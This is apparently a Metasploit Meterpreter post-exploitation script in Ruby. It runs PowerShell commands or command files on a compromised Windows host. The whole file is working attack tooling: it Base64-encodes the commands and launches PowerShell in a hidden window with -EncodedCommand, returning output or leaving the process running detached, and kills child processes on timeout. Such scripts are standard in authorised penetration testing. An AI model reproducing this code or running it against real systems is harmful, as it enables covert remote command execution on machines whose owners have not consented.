#Meterpreter script for running PowerShell Commands or Scripts on Windows
#Provided by Carlos Perez at carlos_perez[at]darkoperator[dot]com
################## Variable Declarations ##################

# Setting Arguments
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu."                        ],
	"-c" => [ true,"Command to execute. The command must be enclosed in double quotes."],
	"-f" => [ true,"File where to saved output of command."],
	"-s" => [ true,"Text file with list of commands, one per line."],
	"-t" => [ true,"Timeout for script. Default 15 seconds."],
	"-d" => [ false,"Run command detatched."]
)
#Setting Argument variables
commands = []
script = []
outfile = nil
timeout = 15
detatched = false

# Encode PowerShell string in to a compatible Base64 String
def encode_powershell(ps2encode)
	command = ps2encode.split("").join("\x00").chomp
	command << "\u0000"
	return Base64.strict_encode64(command)
end

# Execute script and return PID
def execute_detached(client, script)
	print_status("Running command detatched.")
	psh_process = client.sys.process.execute("powershell -noexit -EncodedCommand  " +
					"#{script}", nil, {'Hidden' => true, 'Channelized' => true})
	psh_pid = psh_process.pid
	print_status("PowerShell running under PID #{psh_pid}")

end

# Execute script and return output
def execute_script(client, script, time_out = 15)
	psh_pid = nil
	pids = []
	cmd_out = ""
	begin
		::Timeout::timeout(time_out) do
			psh_process = client.sys.process.execute("powershell -EncodedCommand  " +
					"#{script}", nil, {'Hidden' => true, 'Channelized' => true})
			psh_pid = psh_process.pid
			while (d = psh_process.channel.read)
				#break if d == nil
				cmd_out << d
			end
			psh_process.channel.close
			psh_process.close
		end

	rescue Timeout::Error
		print_error("Execution of script timeout. Running cleanup")
		# Finding PIDs of processes created
		client.sys.process.processes.each do |p|
			pids << p['pid'] if (p["ppid"] == psh_pid.to_i)
		end
		if pids.length >> 0
			# add original process pid to the list
			pids << psh_pid
			# terminating processes
			pids.each do |pid|
				client.sys.process.kill(pid)
			end
		else
			client.sys.process.kill(psh_pid)
		end
	end
	return cmd_out
end

#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end


def usage
	print_line("PowerShell Command Execution Meterpreter Script ")
	print_line @@exec_opts.usage
	raise Rex::Script::Completed
end

################## Main ##################
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-c"

		commands = val

	when "-s"

		script = val
		if not ::File.exists?(script)
			raise "Script File does not exists!"
		else
			::File.open(script, "r").each_line do |line|
				next if line.strip.length < 1
				# Remove comments to save on size
				next if line[0,1] == "#"
				commands << line
			end
		end
	when "-f"

		outfile = val

	when "-t"
		timeout = val

	when "-d"
		detatched = true

	when "-h"
		usage
	else
		print_error "Unknown option: #{opt}"
		usage
	end

}
if args.length == 0
	usage
end
unsupported if client.platform !~ /win32|win64/i

if outfile == nil
	if not detatched
		print_line execute_script(client,encode_powershell(commands),timeout)
	else
		execute_detached(client,encode_powershell(commands))
	end
elsif outfile and not detatched
	print_status("Saving output of PowerShellto #{outfile}")
	filewrt(outfile, execute_script(client,encode_powershell(commands),timeout))
end
